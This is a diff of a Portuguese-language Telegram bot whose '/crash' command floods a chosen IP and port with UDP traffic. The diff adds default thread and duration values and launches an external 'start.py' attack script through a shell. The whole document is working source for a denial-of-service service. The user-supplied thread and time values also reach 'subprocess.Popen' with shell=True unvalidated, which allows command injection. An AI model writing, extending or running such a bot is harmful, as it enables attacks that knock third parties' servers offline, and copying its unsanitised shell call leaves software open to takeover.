@@ -11,7 +11,7 @@ processos = {}
 authorized_users = [SEU_ID_TELEGRAM]  # Lista de usuários autorizados
 MAX_ATTACKS = 3  # Limite de ataques simultâneos
 
-# Função para validar o formato de IP e Porta
+# Função para validar o formato de IP:PORTA
 def validar_ip_porta(ip_porta):
     padrao = r'^\d{1,3}(\.\d{1,3}){3}:\d+$'
     match = re.match(padrao, ip_porta)
@@ -48,7 +48,7 @@ def start_message(message):
         "Bem-vindo ao bot! 🚀\n\n"
         "Aqui estão os comandos disponíveis para você:\n\n"
         "Comandos básicos:\n"
-        "/crash <IP:PORTA> <threads> <tempo> - Envia um ataque ao IP especificado.\n"
+        "/crash <IP:PORTA> [threads] [tempo] - Envia um ataque ao IP especificado. (Padrão: 10 threads, 900 segundos)\n"
         "/meuid - Mostra seu ID de usuário.\n\n"
         "Comandos para o dono do bot:\n"
         "/adduser <ID> - Adiciona um usuário autorizado.\n"
@@ -67,32 +67,39 @@ def crash_server(message):
         return
 
     comando = message.text.split()
-    if len(comando) < 4:
-        bot.send_message(message.chat.id, "Uso correto: /crash <IP:PORTA> <threads> <tempo>")
+    if len(comando) < 2:
+        bot.send_message(message.chat.id, "Uso correto: /crash <IP:PORTA> [threads] [tempo]")
         return
 
     ip_porta = comando[1]
-    threads = comando[2]
-    tempo = comando[3]
+    threads = "10"  # Valor padrão para threads
+    tempo = "900"   # Valor padrão para tempo
+
+    if not validar_ip_porta(ip_porta):
+        bot.send_message(message.chat.id, "Formato de IP:PORTA inválido.")
+        return
+
+    if len(comando) == 3:
+        tempo = comando[2]
+    elif len(comando) == 4:
+        threads = comando[2]
+        tempo = comando[3]
 
     # Verificar se já existe um processo em andamento para o mesmo IP
     if ip_porta in processos:
         bot.send_message(message.chat.id, f"Já existe um ataque em andamento para {ip_porta}. Tente novamente mais tarde.")
         return
 
-    if not validar_ip_porta(ip_porta):
-        bot.send_message(message.chat.id, "Formato de IP:PORTA inválido.")
-        return
-
     # Gerenciar o limite de ataques simultâneos
     manage_attacks()
 
-    # Notificar que o ataque vai começar
-    bot.send_message(message.chat.id, f"Iniciando o ataque para {ip_porta}...")
-
-    # Iniciar o ataque em uma nova thread
-    thread = Thread(target=executar_comando, args=(ip_porta, threads, tempo))
-    thread.start()
+    # Executar o comando no terminal
+    comando_terminal = f"python3 start.py UDP {ip_porta} {threads} {tempo}"
+    try:
+        subprocess.Popen(comando_terminal, shell=True)
+        bot.send_message(message.chat.id, f"Ataque iniciado para {ip_porta} com {threads} threads por {tempo} segundos.")
+    except Exception as e:
+        bot.send_message(message.chat.id, f"Erro ao iniciar o ataque: {str(e)}")
 
 # Comando /meuid
 @bot.message_handler(commands=['meuid'])
